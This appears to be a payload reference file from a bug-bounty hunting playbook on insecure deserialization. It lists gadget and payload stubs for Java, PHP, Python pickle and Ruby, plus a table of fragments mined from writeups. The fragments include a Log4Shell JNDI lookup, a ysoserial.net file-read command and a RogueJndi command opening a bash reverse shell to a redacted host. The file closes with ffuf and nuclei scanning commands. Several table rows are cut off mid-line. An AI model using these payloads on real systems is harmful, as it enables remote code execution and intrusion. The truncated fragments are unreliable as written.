# Payloads — Insecure Deserialization

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# Deserialization — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Java -> `rO0AB...` + ysoserial gadget

- PHP -> `O:8:"stdClass":...`

- Python -> `cos\nsystem\n(S'id'\ntR.` pickle

- Ruby -> `\x04\b[` Marshal



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 3× | `$templates` |

| 3× | `__proto__` |

| 2× | `$cache` |

| 2× | `curl -v \ / --proxy https://127.0.0.1:18443 --proxy-insecure \ / --hsts ./hsts-cache.txt \ / http://hsts-probe.test:18080/` |

| 2× | `cf_ssl_is_alive()` |

| 1× | `system('id')` |

| 1× | `$_COOKIE['nc_form_fields']` |

| 1× | `${jdni:ldap://nps.acronis.com.<your-server>/test}` |

| 1× | `ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */ / { / zend_object *zobj; / zobj = Z_OBJ_P(object); / if (!zobj` |

| 1× | `curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12` |

| 1× | `Gem::Package.new(body).spec` |

| 1× | `PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini` |

| 1× | `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1` |

| 1× | `\\| Packet type (` |

| 1× | `\\|$$$$$$$$$$$$\\|*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |

| 1× | `$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%` |

| 1× | `\\|$$$$$$$$$$$$*************\\|@@@@@@@@@@@@\\|%%%%%%%%%\\|` |

| 1× | `POST /daip/messagebroker/amf HTTP/1.1 / Host: www.███████ / Connection: close / Accept-Encoding: gzip, deflate / Accept: */* / User-Agent: p` |

| 1× | `script.py <collaborator> 80` |

| 1× | `❯ RUBYGEMS_PROXY=true rackup / Puma starting in single mode... / * Puma version: 5.2.2 (ruby 2.7.1-p83) ("Fettisdagsbulle") / * Min threads:` |



## Parameters observed



`id` · `type` · `qid` · `scoretype` · `f.input`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_deserialization.txt` | 76 |

| `~/.local/share/hackerone-reports/wordlists/params_deserialization.txt` | 5 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_deserialization.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_deserialization.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Scanner coverage is thin; decode cookies/tokens and identify the serialization format manually.



```sh

nuclei -u https://target -tags deserialization \

       -severity low,medium,high,critical -rl 40 -o nuclei_deserialization.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/other \

       -rl 40 -o nuclei_deserialization_other.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
